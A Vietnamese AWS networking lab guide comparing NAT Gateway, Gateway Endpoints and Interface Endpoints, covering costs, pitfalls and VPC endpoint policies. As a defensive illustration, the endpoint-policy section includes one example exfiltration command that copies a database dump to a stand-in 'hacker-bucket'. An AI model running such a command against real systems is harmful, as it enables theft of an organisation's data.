# 📘 CẨM NANG THỰC CHIẾN: VPC ENDPOINTS VS NAT GATEWAY & TỐI ƯU HÓA CHI PHÍ (FINOPS)
> **Lab 03:** VPC Endpoints (PrivateLink) vs NAT Gateway & Bài toán tối ưu chi phí  
> **Cấu trúc chuẩn 5 phần:**  
> 1. Service / Khái niệm ➔ 2. **Định nghĩa kỹ thuật chuẩn (Formal Definition)** ➔ 3. **Giải thích dễ hiểu / Ẩn dụ** ➔ 4. **Cách dùng thực tế (Production)** ➔ 5. **Bài học xương máu & Lưu ý**  

---

## 🌐 1. NAT GATEWAY (MANAGED NETWORK ADDRESS TRANSLATION)

### 📐 Định nghĩa kỹ thuật chuẩn (Formal Definition):
* **AWS NAT Gateway** là dịch vụ biên dịch địa chỉ mạng (Source NAT - SNAT) được AWS quản lý toàn diện (Fully Managed), hoạt động ở tầng **Layer 3 & 4 (Network & Transport Layer)**.
* Cho phép các tài nguyên (EC2, Pods, Lambda) nằm trong **Private Subnet** khởi tạo kết nối một chiều ra ngoài Internet (IPv4) hoặc tới các dịch vụ public của AWS, đồng thời **ngăn chặn hoàn toàn** các thực thể từ Internet chủ động khởi tạo kết nối ngược vào.
* **Cơ chế:** Phải đặt tại **Public Subnet**, được cấp phát một **Elastic IP (EIP)** tĩnh, và Private Subnet phải định tuyến `0.0.0.0/0` trỏ tới `nat-gateway-id`.

### 💡 Giải thích dễ hiểu (Ẩn dụ đời thường):
* NAT Gateway giống như **"Bưu điện một chiều có quầy gửi thư bảo mật"**:
  * Bạn ở trong khu biệt lập (Private Subnet), bạn muốn gửi thư ra ngoài thế giới.
  * Bạn mang thư đến Bưu điện (NAT Gateway). Bưu điện dán tem ghi địa chỉ người gửi là bưu điện (EIP) rồi gửi đi.
  * Khi đối tác hồi âm, bưu điện nhận thư và chuyển tiếp về tận tay bạn.
  * Nhưng nếu người lạ ngoài đường tự ý gửi thư tới bưu điện đòi gặp trực tiếp bạn thì bưu điện vứt sọt rác ngay lập tức.

### 🛠️ Cách dùng trong thực tế:
1. **Kiến trúc Dev/Staging (Tối ưu chi phí):**
   * Dùng **1 NAT Gateway duy nhất (Single NAT Gateway)** đặt ở AZ đầu tiên. Mọi Private Subnet ở các AZ khác cùng trỏ về con NAT này.
   * *Mục tiêu:* Tiết kiệm ~$32.4/tháng cho mỗi AZ không cần thiết.
2. **Kiến trúc Production (Tính sẵn sàng cao - High Availability):**
   * Bắt buộc dựng **mỗi AZ một NAT Gateway riêng biệt (Multi-AZ NAT)** kèm bảng Route Table Private riêng cho từng AZ.
   * *Mục tiêu:* Nếu một Availability Zone của AWS gặp sự cố (cháy trạm điện, đứt cáp), các AZ còn lại vẫn có đường truyền ra Internet độc lập.

### 🩸 Bài học xương máu & Điều cần lưu ý:
1. **"Cú lừa" hóa đơn Data Processing ($0.045 / GB):**
   * NAT Gateway không chỉ tính tiền thuê giờ (~$32.4/tháng), mà còn thu **$0.045 trên MỖI GIGABYTE** dữ liệu đi qua.
   * Nếu đổ traffic kéo Docker Image nặng từ ECR, đọc ghi backup database hàng Terabyte lên S3 qua NAT Gateway, hóa đơn cuối tháng sẽ tăng vọt hàng ngàn USD!
2. **Bẫy kiệt quệ cổng (SNAT Port Exhaustion):**
   * Một NAT Gateway trên 1 IP chỉ hỗ trợ tối đa **55,000 kết nối đồng thời** tới cùng một địa chỉ IP và Port đích.
   * Nếu hàng trăm microservices liên tục mở kết nối HTTP mới mà **không dùng Connection Pooling (Keep-Alive)** tới cùng một API bên thứ ba (ví dụ PayOS, Stripe), bảng SNAT port sẽ bị tràn $\rightarrow$ Kết nối mới bị drop, timeout bí ẩn mà CPU/RAM server vẫn ở mức thấp!

---

## 🚪 2. GATEWAY ENDPOINT (MIỄN PHÍ - S3 & DYNAMODB)

### 📐 Định nghĩa kỹ thuật chuẩn (Formal Definition):
* **Gateway Endpoint** là một cổng chuyển tiếp định tuyến ảo thuộc mạng hạ tầng ngầm của AWS (AWS Network Fabric), đóng vai trò là một **Target** trong bảng định tuyến (Route Table) cho các gói tin có đích đến là **S3** hoặc **DynamoDB**.
* Hoạt động dựa trên **Prefix List** (`pl-xxxx`, chứa toàn bộ dải IP public của S3/DynamoDB trong Region).
* Traffic di chuyển hoàn toàn trên **đường truyền mạng riêng nội bộ của AWS**, không đi qua Internet Gateway, không qua NAT Gateway, không qua card mạng ENI.

### 💡 Giải thích dễ hiểu (Ẩn dụ đời thường):
* Gateway Endpoint giống như **"Đường hầm riêng / Cầu vượt nội bộ nối thẳng sang kho hàng S3"**:
  * Bình thường muốn sang kho hàng, bạn phải đi ra đường cái đông đúc và nộp phí cầu đường (NAT Gateway).
  * Nay ban quản lý mở một đường hầm nội bộ đi bộ thẳng sang kho hàng: **Hoàn toàn miễn phí, không kẹt xe, không sợ cướp giật (Hacker) dòm ngó.**

### 🛠️ Cách dùng trong thực tế:
* **Quy tắc bất di bất dịch:** Bất cứ khi nào khởi tạo một VPC mới, **NGAY LẬP TỨC TẠO S3 & DYNAMODB GATEWAY ENDPOINT**.
* Gán Route Table IDs vào **TẤT CẢ** các bảng định tuyến trong VPC (cả Private Route Tables và Public Route Tables).

### 🩸 Bài học xương máu & Điều cần lưu ý:
1. **Hoàn toàn MIỄN PHÍ ($0 / giờ, $0 / GB):** Không có lý do gì để không bật dịch vụ này.
2. **Không thể truy cập qua Transit Gateway / VPN / Direct Connect:**
   * Gateway Endpoint chỉ có giá trị cục bộ bên trong VPC chứa nó.
   * Nếu có hệ thống máy chủ On-Premise kết nối qua Direct Connect/VPN muốn truy cập S3 qua IP riêng, Gateway Endpoint **vô tác dụng**. Lúc đó bắt buộc phải dùng *S3 Interface Endpoint*.
3. **Phải gắn vào cả Public Route Table:** Nhiều kỹ sư chỉ gắn vào Private Route Table. Nếu có máy Bastion hoặc máy build CI runner nằm ở Public Subnet đẩy file lên S3, nó vẫn bị tính phí truyền dữ liệu ra ngoài Internet nếu không gắn endpoint vào public route table.

---

## 🔌 3. INTERFACE ENDPOINT (AWS PRIVATELINK / ENI-BASED)

### 📐 Định nghĩa kỹ thuật chuẩn (Formal Definition):
* **Interface Endpoint (AWS PrivateLink)** là cơ chế kết nối mạng riêng tư dựa trên việc tạo ra các **Card mạng ảo (Elastic Network Interface - ENI)** có địa chỉ IP Private nằm trực tiếp bên trong Subnet của bạn.
* ENI này đóng vai trò là điểm đón đầu (Entry Point) cho mọi traffic hướng tới các dịch vụ AWS được hỗ trợ (ECR, CloudWatch, KMS, Secrets Manager, SQS, SNS...) hoặc các dịch vụ SaaS của bên thứ ba.
* Sử dụng tính năng **Private DNS**: Tự động chặn và phân giải tên miền chuẩn của AWS (ví dụ: `logs.ap-southeast-1.amazonaws.com`) về chính địa chỉ IP Private của ENI thay vì IP Public ngoài Internet.

### 💡 Giải thích dễ hiểu (Ẩn dụ đời thường):
* Interface Endpoint giống như **"Văn phòng đại diện / Quầy giao dịch đặt ngay trong nhà bạn"**:
  * Bạn không cần lái xe ra bưu điện thành phố để gửi giấy tờ.
  * Cơ quan CloudWatch / ECR cử nhân viên đến đặt bàn làm việc ngay trong phòng khách (Subnet) của bạn với số máy nội bộ. Bạn đưa tài liệu cho nhân viên này là xong việc.

### 🛠️ Cách dùng trong thực tế:
* Dùng cho hệ thống **Isolated VPC (Mạng cô lập hoàn toàn, không có Internet Gateway, không có NAT Gateway)** theo chuẩn bảo mật ngân hàng, tài chính (PCI-DSS, HIPAA, ISO 27001).
* Cho phép các Worker Node của cụm Kubernetes (EKS) trong Private Subnet kéo image từ ECR, đọc cấu hình từ Secrets Manager, giải mã KMS mà không cần mở bất kỳ luồng mạng nào ra thế giới bên ngoài.

### 🩸 Bài học xương máu & Điều cần lưu ý:
1. **Cạm bẫy chi phí cố định (The Idle ENI Cost Trap):**
   * Mỗi Interface Endpoint tính phí **$0.01/giờ trên TỪNG AZ** ($7.2/tháng/AZ).
   * Nếu bạn bật 6 dịch vụ trên 2 AZ $\rightarrow$ Sinh ra 12 ENI $\rightarrow$ Chi phí cố định mất **~$87.60/tháng** ngay cả khi không gửi 1 byte dữ liệu nào!
   * *Kinh nghiệm:* Với môi trường Dev/Staging nhỏ, chỉ bật những endpoint thực sự sống còn (như ECR nếu bắt buộc). Đừng "lạm dụng" bật tràn lan.
2. **Cạm bẫy Security Group (Port 443 Timeout):**
   * Interface Endpoint là một ENI thực sự, nên nó **bắt buộc phải gắn Security Group**.
   * Nếu quên mở **Inbound Port 443 (HTTPS)** từ dải CIDR của Subnet/VPC, toàn bộ SDK AWS trong code (NestJS/Nodejs) khi gọi dịch vụ sẽ bị treo vô tận (Hang/Timeout) mà không trả về lỗi ngay.
3. **Yêu cầu DNS trên VPC:**
   * Phải bật cả 2 cờ: `enable_dns_hostnames = true` và `enable_dns_support = true` trên VPC, nếu không tính năng Private DNS không hoạt động, ứng dụng vẫn sẽ resolve ra IP Public.

---

## 🔒 4. VPC ENDPOINT POLICY (CHỐNG THẤT THOÁT DỮ LIỆU - DATA EXFILTRATION)

### 📐 Định nghĩa kỹ thuật chuẩn (Formal Definition):
* **VPC Endpoint Policy** là một tài nguyên chính sách IAM (Resource-based Policy) được gắn trực tiếp lên Gateway hoặc Interface Endpoint.
* Nó hoạt động như một **vành đai kiểm soát biên giới (Perimeter Guard)**, giới hạn danh tính nào (Principal), hành động nào (Action), và tài nguyên nào (Resource) được phép đi xuyên qua điểm cuối này.
* **Nguyên tắc thẩm quyền (Authorization Intersection):** Quyền thực tế của một request là **phần giao (Intersection)** giữa IAM Role của máy gọi VÀ Endpoint Policy. Cả hai cùng cho phép thì request mới thành công.

### 💡 Giải thích dễ hiểu (Ẩn dụ đời thường):
* Endpoint Policy giống như **"Nhân viên an ninh tại cổng soát vé"**:
  * Dù nhân viên của bạn có "Thẻ đỏ quyền lực" (IAM Role AdministratorAccess), nhưng khi mang vali đồ ra khỏi cổng:
  * An ninh chặn lại và kiểm tra: *"Hàng hóa trong vali có mã số nội bộ công ty (`tuanstark-production-data`) không? Nếu là vali của người khác mang ra ngoài $\rightarrow$ Tịch thu ngay!"*

### 🛠️ Cách dùng trong thực tế:
* Chống lại mã độc hoặc nhân viên bất mãn: Dù máy chủ bị chiếm quyền shell, kẻ tấn công chạy lệnh `aws s3 cp my-database.sql s3://hacker-bucket/` cũng sẽ nhận ngay lỗi `403 Forbidden` vì Endpoint Policy chặn lại tại cửa ngõ VPC.

### 🩸 Bài học xương máu & Điều cần lưu ý:
1. **Bắt buộc phải có `Principal`:**
   * Trong Terraform, khi viết `data "aws_iam_policy_document"` cho Endpoint Policy, bắt buộc phải khai báo block `principals { type = "*" identifiers = ["*"] }`. Thiếu block này sẽ dẫn đến lỗi `MalformedPolicyDocument` từ AWS API.
2. **Bẫy Deny `not_resources`:**
   * Endpoint Policy vốn đã có tính chất **Implicit Deny** (chỉ cần `Allow` bucket của công ty là tự động chặn mọi bucket khác).
   * Không nên viết thêm block `Deny not_resources` vì nó sẽ vô tình chặn đứng các hành động kiểm tra siêu dữ liệu như `s3:ListAllMyBuckets` hoặc các tích hợp của AWS service ngầm.

---

## ⚔️ MA TRẬN SO SÁNH & RA QUYẾT ĐỊNH FINOPS

| Tiêu chí so sánh | NAT Gateway | Gateway Endpoint | Interface Endpoint (PrivateLink) |
| :--- | :--- | :--- | :--- |
| **Dịch vụ hỗ trợ** | Toàn bộ Internet (Mọi dịch vụ) | **Chỉ S3 & DynamoDB** | Hầu hết dịch vụ AWS nội bộ + SaaS |
| **Bản chất kiến trúc** | Server proxy quản lý bởi AWS | Target route trong Route Table | Card mạng ảo (ENI) trong Subnet |
| **Phí duy trì (Hourly)** | ~$0.045 / giờ / NAT (~$32.4/tháng) | **HOÀN TOÀN MIỄN PHÍ ($0)** | ~$0.01 / giờ / AZ (~$7.2/tháng) |
| **Phí Data Processing** | **$0.045 / GB** | **HOÀN TOÀN MIỄN PHÍ ($0)** | **$0.01 / GB** (Rẻ hơn NAT 78%) |
| **Bảo mật Perimeter** | Kém (Mở 0.0.0.0/0 ra ngoài) | Rất cao (Có Endpoint Policy) | Rất cao (Có SG + Endpoint Policy) |
| **Hỗ trợ On-Premises** | Không | Không | **Có** (Qua Direct Connect / VPN) |

---

### 🧠 CÔNG THỨC VÀNG ĐỂ RA QUYẾT ĐỊNH CHO KỸ SƯ CLOUD:

1. **Với S3 & DynamoDB:** Luôn dùng **Gateway Endpoint**. Tiết kiệm 100% chi phí.
2. **Với các dịch vụ AWS khác (CloudWatch, ECR, KMS...):**
   * Tính toán điểm hòa vốn: 
     $$\text{Chi phí NAT} = \text{Data (GB)} \times 0.045$$
     $$\text{Chi phí Interface} = (N_{\text{AZ}} \times \$7.2) + (\text{Data (GB)} \times 0.01)$$
   * Nếu lượng dữ liệu truyền tải của dịch vụ đó **vượt quá ~200 GB/tháng/AZ**: Chuyển ngay sang **Interface Endpoint** để vừa bảo mật vừa có lãi về chi phí!
